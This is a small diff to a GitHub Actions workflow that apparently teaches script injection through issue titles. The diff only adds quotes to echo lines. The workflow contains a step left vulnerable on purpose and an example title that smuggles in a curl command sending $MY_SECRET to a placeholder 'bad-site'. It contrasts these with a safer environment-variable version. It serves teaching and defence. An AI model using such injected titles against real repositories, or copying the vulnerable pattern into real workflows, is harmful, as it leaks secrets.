@@ -15,7 +15,7 @@ jobs:
           echo This is a step vulnerable to script injection
           echo Open/Reopen an issue entitled, e.g.':' 'a";echo !!! I have bugexecuted a script !!!"'
           echo As a result, an echo script will be executed 
-          echo (and btw issue is NOT identified as bug cause it is another command already) 
+          echo "(and btw issue is NOT identified as bug cause it is another command already)" 
           echo Now imagine such a name ':' 'a"; curl http://bad-site/steal-password/$MY_SECRET'
           echo ---
           title="${{github.event.issue.title}}"
@@ -34,7 +34,7 @@ jobs:
           echo Before using the text, the script sets it as environment variable - treats it as text only
           echo Open/Reopen an issue entitled, e.g.':' 'a";echo !!! I have bugexecuted a script !!!"'
           echo Now the script in the title won't be executed
-          echo (and the issue WILL be identified as bug because the whole string is considered as text)
+          echo "(and the issue WILL be identified as bug because the whole string is considered as text)"
           echo ---
           if [[ "$TITLE" == *"bug"* ]]; 
           then
